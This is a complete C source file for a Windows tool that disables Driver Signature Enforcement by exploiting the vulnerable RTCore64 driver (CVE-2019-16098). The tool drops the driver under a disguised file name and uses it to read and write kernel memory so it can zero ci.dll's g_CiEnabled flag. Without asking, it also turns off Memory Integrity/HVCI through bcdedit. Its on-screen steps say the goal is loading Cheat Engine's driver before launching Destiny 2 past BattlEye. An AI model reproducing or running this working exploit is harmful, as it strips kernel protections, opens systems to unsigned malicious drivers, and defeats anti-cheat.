/*
 * dse_fix_win11.c  —  DSE disabler via RTCore64 BYOVD (CVE-2019-16098)
 * Windows 10 1903 – 11 24H2, all builds.
 *
 * Compile (MSVC x64 Dev Prompt):
 *   cl /O2 /W3 dse_fix_win11.c /link ntdll.lib advapi32.lib
 *
 * Usage:
 *   dse_fix_win11.exe           interactive: disable DSE, wait ENTER, restore
 *   dse_fix_win11.exe -off      silent: disable DSE (state saved to %%TEMP%%)
 *   dse_fix_win11.exe -on       silent: restore DSE from saved state
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#include "rtcore64_bytes.h"

/* ─── RTCore64 defs ─────────────────────────────────────────────────────────*/

#define RTCORE64_DEVICE   L"\\\\.\\RTCore64"
#define IOCTL_RT_READ     0x80002048
#define IOCTL_RT_WRITE    0x8000204C
#define RTCORE64_SVC_NAME L"RTCore64"

#pragma pack(push, 1)
typedef struct { DWORD Pad0[2]; ULONGLONG Address; DWORD Pad1; DWORD ReadSize;  ULONGLONG ReadValue;  } RTCORE_READ;
typedef struct { DWORD Pad0[2]; ULONGLONG Address; DWORD Pad1; DWORD WriteSize; ULONGLONG WriteValue; } RTCORE_WRITE;
#pragma pack(pop)

static HANDLE    g_hDev   = INVALID_HANDLE_VALUE;
static SC_HANDLE g_hScm   = NULL;
static SC_HANDLE g_hSvc   = NULL;
static BOOL      g_ownSvc = FALSE;
static wchar_t   g_SysPath[MAX_PATH] = {0};

/* ─── NtQuerySystemInformation ──────────────────────────────────────────────*/

typedef NTSTATUS (NTAPI *pNtQSI)(ULONG, PVOID, ULONG, PULONG);
static pNtQSI NtQSI;

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

typedef struct {
    ULONG     NextEntryOffset; UCHAR NumberOfThreads; UCHAR Pad1[3]; ULONG Flags;
    PVOID     Reserved2; HANDLE Section; PVOID MappedBase; PVOID InitOrderLinks;
    ULONGLONG ImageSize; ULONG Flags2; USHORT LoadOrderIndex; USHORT InitOrderIndex;
    USHORT    LoadCount; USHORT OffsetToFileName; UCHAR FullPathName[256];
} SYS_MODULE_ENTRY;
typedef struct { ULONG NumberOfModules; SYS_MODULE_ENTRY Modules[1]; } SYS_MODULE_INFO;

/* ─── State persistence ─────────────────────────────────────────────────────*/

typedef struct { ULONGLONG ciAddr; ULONGLONG ciOrig; } DSE_STATE;

static wchar_t g_StatePath[MAX_PATH] = {0};

static void InitStatePath(void) {
    wchar_t tmp[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    swprintf_s(g_StatePath, MAX_PATH, L"%sdse_state.bin", tmp);
}

static BOOL SaveState(ULONGLONG addr, ULONGLONG orig) {
    DSE_STATE s = {addr, orig};
    HANDLE h = CreateFileW(g_StatePath, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD wr; BOOL ok = WriteFile(h, &s, sizeof(s), &wr, NULL);
    CloseHandle(h);
    return ok;
}

static BOOL LoadState(ULONGLONG *addr, ULONGLONG *orig) {
    DSE_STATE s = {0};
    HANDLE h = CreateFileW(g_StatePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD rd; BOOL ok = ReadFile(h, &s, sizeof(s), &rd, NULL);
    CloseHandle(h);
    if (!ok || rd != sizeof(s) || !s.ciAddr) return FALSE;
    *addr = s.ciAddr; *orig = s.ciOrig;
    return TRUE;
}

static void ClearState(void) { DeleteFileW(g_StatePath); }

/* ─── Test-signing BCD check ────────────────────────────────────────────────*/

static BOOL IsTestSigningOn(void) {
    FILE *fp = _popen("bcdedit /enum current 2>nul", "r");
    if (!fp) return FALSE;
    char line[512]; BOOL found = FALSE;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "testsigning") &&
            (strstr(line, "Yes") || strstr(line, "yes"))) {
            found = TRUE; break;
        }
    }
    _pclose(fp);
    return found;
}

static void ClearTestSigning(void) {
    system("bcdedit /set testsigning off >nul 2>&1");
    system("bcdedit /set nointegritychecks off >nul 2>&1");
}

/* ─── Driver drop + SCM ─────────────────────────────────────────────────────*/

static void KillStaleService(void) {
    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return;
    SC_HANDLE hSvc = OpenServiceW(hScm, RTCORE64_SVC_NAME, SERVICE_ALL_ACCESS);
    if (hSvc) {
        SERVICE_STATUS ss;
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(600);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
}

static BOOL DropDriver(void) {
    KillStaleService();
    wchar_t tmp[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    swprintf_s(g_SysPath, MAX_PATH, L"%shwinfo_helper.sys", tmp);
    HANDLE h = CreateFileW(g_SysPath, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD written;
    BOOL ok = WriteFile(h, RTCORE64_SYS_DATA, RTCORE64_SYS_SIZE, &written, NULL);
    CloseHandle(h);
    return ok && (written == RTCORE64_SYS_SIZE);
}

static void DisableHVCI(void) {
    system("bcdedit /set hypervisorlaunchtype off >nul 2>&1");
    system("bcdedit /set vsmlaunchtype off >nul 2>&1");
}

#define ERR_HVCI_BLOCKED 0xDEAD0001

static DWORD LoadDriver(void) {
    g_hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!g_hScm) return GetLastError();
    g_hSvc = OpenServiceW(g_hScm, RTCORE64_SVC_NAME, SERVICE_ALL_ACCESS);
    if (!g_hSvc) {
        g_hSvc = CreateServiceW(g_hScm, RTCORE64_SVC_NAME, RTCORE64_SVC_NAME,
                                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                                g_SysPath, NULL, NULL, NULL, NULL, NULL);
        if (!g_hSvc) return GetLastError();
        g_ownSvc = TRUE;
    }
    if (!StartServiceW(g_hSvc, 0, NULL)) {
        DWORD e = GetLastError();
        if (e == ERROR_SERVICE_ALREADY_RUNNING) goto open_dev;
        if (e == ERROR_ACCESS_DENIED || e == 1275 /* DRIVER_BLOCKED */ || e == 577 /* INVALID_IMAGE_HASH */) {
            fprintf(stderr, "\n%s\n", "============================================================");
            fprintf(stderr, "[!] RTCore64 blocked — Memory Integrity (HVCI) is ON.\n\n");
            fprintf(stderr, "  Win11 23H2/24H2 enables this by default. One-time fix:\n\n");
            fprintf(stderr, "  Option A (GUI):\n");
            fprintf(stderr, "    Windows Security -> Device Security\n");
            fprintf(stderr, "    -> Core Isolation -> Memory Integrity -> OFF -> Reboot\n\n");
            fprintf(stderr, "  Option B (auto-applied, reboot after):\n");
            fprintf(stderr, "    bcdedit /set hypervisorlaunchtype off\n");
            fprintf(stderr, "    bcdedit /set vsmlaunchtype off\n\n");
            DisableHVCI();
            fprintf(stderr, "  [+] bcdedit flags set. REBOOT NOW, then run this again.\n");
            fprintf(stderr, "  After one reboot this works every session, no reboot needed.\n");
            fprintf(stderr, "%s\n\n", "============================================================");
            return ERR_HVCI_BLOCKED;
        }
        return e;
    }
open_dev:
    Sleep(500);
    g_hDev = CreateFileW(RTCORE64_DEVICE, GENERIC_READ | GENERIC_WRITE,
                         0, NULL, OPEN_EXISTING, 0, NULL);
    return (g_hDev != INVALID_HANDLE_VALUE) ? 0 : GetLastError();
}

static void UnloadDriver(void) {
    if (g_hDev != INVALID_HANDLE_VALUE) { CloseHandle(g_hDev); g_hDev = INVALID_HANDLE_VALUE; }
    if (g_hSvc) {
        SERVICE_STATUS ss;
        ControlService(g_hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(400);
        if (g_ownSvc) DeleteService(g_hSvc);
        CloseServiceHandle(g_hSvc); g_hSvc = NULL;
    }
    if (g_hScm) { CloseServiceHandle(g_hScm); g_hScm = NULL; }
    if (g_SysPath[0]) { DeleteFileW(g_SysPath); g_SysPath[0] = 0; }
}

/* ─── RTCore64 IOCTL ────────────────────────────────────────────────────────*/

static BOOL KRead(ULONGLONG addr, DWORD size, ULONGLONG *out) {
    RTCORE_READ req = {0}; DWORD bytes;
    req.Address = addr; req.ReadSize = size;
    if (!DeviceIoControl(g_hDev, IOCTL_RT_READ, &req, sizeof(req),
                         &req, sizeof(req), &bytes, NULL)) return FALSE;
    *out = req.ReadValue; return TRUE;
}

static BOOL KWrite(ULONGLONG addr, ULONGLONG val, DWORD size) {
    RTCORE_WRITE req = {0}; DWORD bytes;
    req.Address = addr; req.WriteSize = size; req.WriteValue = val;
    return DeviceIoControl(g_hDev, IOCTL_RT_WRITE, &req, sizeof(req),
                           &req, sizeof(req), &bytes, NULL);
}

/* ─── Find CI.dll kernel base ───────────────────────────────────────────────*/

static ULONGLONG GetCIBase(ULONG *outSize) {
    ULONG needed = 0; PVOID buf = NULL; NTSTATUS st;
    do {
        needed += 0x10000; free(buf); buf = malloc(needed);
        if (!buf) return 0;
        st = NtQSI(11, buf, needed, &needed);
    } while (st == (NTSTATUS)STATUS_INFO_LENGTH_MISMATCH);
    if (st) { free(buf); return 0; }

    SYS_MODULE_INFO *info = (SYS_MODULE_INFO *)buf;
    ULONGLONG base = 0;
    for (ULONG i = 0; i < info->NumberOfModules; i++) {
        SYS_MODULE_ENTRY *e = &info->Modules[i];
        const char *name = (const char *)e->FullPathName + e->OffsetToFileName;
        if (_stricmp(name, "ci.dll") == 0) {
            base = (ULONGLONG)e->MappedBase;
            if (outSize) *outSize = (ULONG)e->ImageSize;
            break;
        }
    }
    free(buf); return base;
}

/* ─── Section table helper ──────────────────────────────────────────────────*/

#define MAX_SECTS 32
typedef struct { char name[9]; ULONG vaddr; ULONG vsz; } SECT_INFO;

static BOOL IsExecSection(const char *name) {
    return _stricmp(name, ".text") == 0 ||
           _stricmp(name, "PAGE")  == 0 ||
           _stricmp(name, "INIT")  == 0 ||
           _stricmp(name, ".pdata")== 0 ||
           _stricmp(name, ".xdata")== 0;
}

/* ─── Pattern scan disk CI.dll ───────────────────────────────────────────────
 * Collects RIP-relative byte-access instructions from .text, filters out
 * any whose target RVA lands back in an executable section.
 * All major patterns across Win10/11 24H2 covered (REX variants included).
 */

#define MAX_CAND 32

static ULONG FindGCiEnabledCandidates(ULONGLONG ciKernelBase, ULONG ciSz,
                                      ULONGLONG *out, ULONG maxOut) {
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat_s(path, MAX_PATH, L"\\ci.dll");

    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    DWORD sz = GetFileSize(hf, NULL);
    PBYTE img = (PBYTE)malloc(sz); DWORD rd;
    ReadFile(hf, img, sz, &rd, NULL); CloseHandle(hf);

    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER *)img;
    IMAGE_NT_HEADERS64 *nt  = (IMAGE_NT_HEADERS64 *)(img + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    WORD nsec = nt->FileHeader.NumberOfSections;

    SECT_INFO sects[MAX_SECTS]; WORD nsi = 0;
    PBYTE txtRaw = NULL; ULONG txtVA = 0, txtSz = 0;

    for (WORD i = 0; i < nsec && nsi < MAX_SECTS; i++) {
        memset(sects[nsi].name, 0, sizeof(sects[nsi].name));
        memcpy(sects[nsi].name, sec[i].Name,
               min(sizeof(sects[nsi].name)-1, sizeof(sec[i].Name)));
        sects[nsi].vaddr = sec[i].VirtualAddress;
        sects[nsi].vsz   = max(sec[i].Misc.VirtualSize, sec[i].SizeOfRawData);
        nsi++;
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            txtRaw = img + sec[i].PointerToRawData;
            txtVA  = sec[i].VirtualAddress;
            txtSz  = sec[i].SizeOfRawData;
        }
    }

    ULONG nCand = 0;
    /* Track seen RVAs to dedup */
    ULONG seenRva[MAX_CAND] = {0};

    if (!txtRaw) { free(img); return 0; }

    for (ULONG i = 0; i + 8 < txtSz && nCand < maxOut; ) {
        PBYTE p = txtRaw + i;

        /* Optional REX prefix */
        ULONG skip = 0;
        if ((p[0] & 0xF0) == 0x40 && i + 9 < txtSz) { skip = 1; }

        PBYTE q = p + skip;
        ULONG instr_len = 0;
        PBYTE disp = NULL;

        /* MOVZX r32, byte [rip+d32]:  0F B6 ModRM(mod00,rm5) d32 */
        if (q[0] == 0x0F && q[1] == 0xB6 && (q[2] & 0xC7) == 0x05) {
            instr_len = skip + 7; disp = q + 3;
        }
        /* MOV r8, [rip+d32]:  8A ModRM(mod00,rm5) d32 */
        else if (q[0] == 0x8A && (q[1] & 0xC7) == 0x05) {
            instr_len = skip + 6; disp = q + 2;
        }
        /* MOV [rip+d32], r8:  88 ModRM(mod00,rm5) d32 */
        else if (q[0] == 0x88 && (q[1] & 0xC7) == 0x05) {
            instr_len = skip + 6; disp = q + 2;
        }
        /* CMP byte [rip+d32], imm8:  80 3D d32 imm8 */
        else if (q[0] == 0x80 && q[1] == 0x3D && i + skip + 7 < txtSz) {
            instr_len = skip + 7; disp = q + 2;
        }
        /* TEST byte [rip+d32], imm8:  F6 05 d32 imm8 */
        else if (q[0] == 0xF6 && q[1] == 0x05 && i + skip + 7 < txtSz) {
            instr_len = skip + 7; disp = q + 2;
        }
        /* OR/AND byte [rip+d32], imm8:  80 0D/25 d32 imm8 */
        else if (q[0] == 0x80 && (q[1] == 0x0D || q[1] == 0x25) && i + skip + 7 < txtSz) {
            instr_len = skip + 7; disp = q + 2;
        }

        if (disp && instr_len) {
            INT32  d   = *(INT32 *)disp;
            LONG64 rva = (LONG64)(txtVA + i + instr_len) + d;

            if (rva > 0 && (ULONG)rva < sz) {
                /* Reject target in executable sections */
                BOOL exec = FALSE;
                for (WORD si = 0; si < nsi; si++) {
                    if (sects[si].vaddr <= (ULONG)rva &&
                        (ULONG)rva < sects[si].vaddr + sects[si].vsz) {
                        exec = IsExecSection(sects[si].name);
                        break;
                    }
                }
                if (!exec) {
                    ULONGLONG kAddr = ciKernelBase + (ULONGLONG)rva;
                    /* Dedup */
                    BOOL dup = FALSE;
                    for (ULONG j = 0; j < nCand; j++)
                        if (seenRva[j] == (ULONG)rva) { dup = TRUE; break; }
                    if (!dup) {
                        seenRva[nCand]  = (ULONG)rva;
                        out[nCand++]    = kAddr;
                    }
                }
            }
            i += instr_len;
        } else {
            i++;
        }
    }

    free(img);
    printf("[*] %lu g_CiEnabled candidate(s)\n", nCand);
    return nCand;
}

/* ─── Patch / restore ───────────────────────────────────────────────────────*/

static BOOL PatchDSE(ULONGLONG *outAddr, ULONGLONG *outOrig) {
    ULONG ciSz = 0;
    ULONGLONG ciBase = GetCIBase(&ciSz);
    if (!ciBase) { fprintf(stderr, "[!] ci.dll not found\n"); return FALSE; }
    printf("[*] ci.dll  base=0x%llX  size=0x%X\n", ciBase, ciSz);

    ULONGLONG cands[MAX_CAND]; ULONG nCand;
    nCand = FindGCiEnabledCandidates(ciBase, ciSz, cands, MAX_CAND);
    if (!nCand) { fprintf(stderr, "[!] No candidates found\n"); return FALSE; }

    ULONGLONG ciAddr = 0, ciOrig = 0;

    /* Pick first candidate with sane CI flags value (1-63) */
    for (ULONG i = 0; i < nCand && !ciAddr; i++) {
        ULONGLONG val = 0;
        if (KRead(cands[i], 1, &val) && val >= 1 && val <= 63) {
            ciAddr = cands[i]; ciOrig = val;
        }
    }
    /* Fallback: first readable */
    for (ULONG i = 0; i < nCand && !ciAddr; i++) {
        ULONGLONG val = 0;
        if (KRead(cands[i], 1, &val)) { ciAddr = cands[i]; ciOrig = val; }
    }

    if (!ciAddr) { fprintf(stderr, "[!] All candidates unreadable — HVCI on?\n"); return FALSE; }
    printf("[*] g_CiEnabled @ 0x%llX  current=0x%llX\n", ciAddr, ciOrig);

    if (!KWrite(ciAddr, 0, 1)) { fprintf(stderr, "[!] KWrite failed\n"); return FALSE; }

    ULONGLONG chk = 0xFF;
    KRead(ciAddr, 1, &chk);
    if (chk != 0) {
        fprintf(stderr, "[!] Verify failed (0x%llX)\n", chk);
        return FALSE;
    }

    *outAddr = ciAddr; *outOrig = ciOrig;
    return TRUE;
}

static void RestoreDSE(ULONGLONG ciAddr, ULONGLONG ciOrig) {
    if (!ciAddr) return;
    KWrite(ciAddr, ciOrig, 1);
    printf("[*] DSE restored (0x%llX)\n", ciOrig);
}

/* ─── Bootstrap ─────────────────────────────────────────────────────────────*/

/* Returns 0=ok, ERR_HVCI_BLOCKED=needs reboot, other=fatal */
static DWORD Bootstrap(void) {
    if (!DropDriver()) { fprintf(stderr, "[!] DropDriver failed\n"); return ERROR_WRITE_FAULT; }
    printf("[*] Dropped: %S\n", g_SysPath);
    DWORD e = LoadDriver();
    if (e) return e;
    printf("[+] RTCore64 device open.\n");
    return 0;
}

/* ─── Entry point ───────────────────────────────────────────────────────────*/

int main(int argc, char **argv) {
    InitStatePath();

    const char *flag = (argc > 1) ? argv[1] : "";
    BOOL silent = (_stricmp(flag, "-off") == 0 || _stricmp(flag, "-on") == 0);

    if (!silent)
        printf("=== D2 DSE Fix (BYOVD / RTCore64) ===\n\n");

    /* Elevation check */
    BOOL elev = FALSE;
    HANDLE tok; DWORD n;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        TOKEN_ELEVATION te;
        if (GetTokenInformation(tok, TokenElevation, &te, sizeof(te), &n))
            elev = te.TokenIsElevated;
        CloseHandle(tok);
    }
    if (!elev) { fprintf(stderr, "[!] Run as Administrator.\n"); return 1; }

    NtQSI = (pNtQSI)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                                    "NtQuerySystemInformation");
    if (!NtQSI) { fprintf(stderr, "[!] NtQuerySystemInformation not found\n"); return 1; }

    /* Test-signing BCD check */
    if (IsTestSigningOn()) {
        fprintf(stderr, "[!] Test-signing BCD flag ON — BattlEye will refuse.\n");
        fprintf(stderr, "    Disabling via bcdedit...\n");
        ClearTestSigning();
        fprintf(stderr, "    *** REBOOT REQUIRED. Run again after reboot. ***\n");
        if (!silent) { printf("Press ENTER to exit..."); getchar(); }
        /* still proceed — CE driver may load this session */
    }

    /* -on: restore DSE from saved state */
    if (_stricmp(flag, "-on") == 0) {
        ULONGLONG addr = 0, orig = 0;
        if (!LoadState(&addr, &orig)) {
            fprintf(stderr, "[!] No saved state — run -off first.\n");
            return 1;
        }
        DWORD be = Bootstrap();
        if (be == ERR_HVCI_BLOCKED) return 2;
        if (be) { fprintf(stderr, "[!] Bootstrap err=%lu\n", be); return 1; }
        RestoreDSE(addr, orig);
        UnloadDriver();
        ClearState();
        printf("[+] DSE ON.\n");
        return 0;
    }

    /* -off or interactive: load RTCore + patch */
    {
        DWORD be = Bootstrap();
        if (be == ERR_HVCI_BLOCKED) {
            if (!silent) { printf("Press ENTER to exit..."); getchar(); }
            return 2;
        }
        if (be) { fprintf(stderr, "[!] Bootstrap err=%lu\n", be); return 1; }
    }

    ULONGLONG ciAddr = 0, ciOrig = 0;
    if (!PatchDSE(&ciAddr, &ciOrig)) {
        RestoreDSE(ciAddr, ciOrig);
        UnloadDriver();
        if (!silent) { printf("Press ENTER..."); getchar(); }
        return 1;
    }
    printf("[+] DSE OFF.\n");

    if (_stricmp(flag, "-off") == 0) {
        SaveState(ciAddr, ciOrig);
        UnloadDriver();
        return 0;
    }

    /* Interactive mode */
    printf("\n    1. Launch CE as Admin\n");
    printf("    2. Let CE load its driver\n");
    printf("    3. Press ENTER to re-enable DSE\n");
    printf("    4. Then launch Destiny 2\n\n> ");
    fflush(stdout);
    getchar();

    RestoreDSE(ciAddr, ciOrig);
    UnloadDriver();
    printf("[+] Done.\n");
    return 0;
}
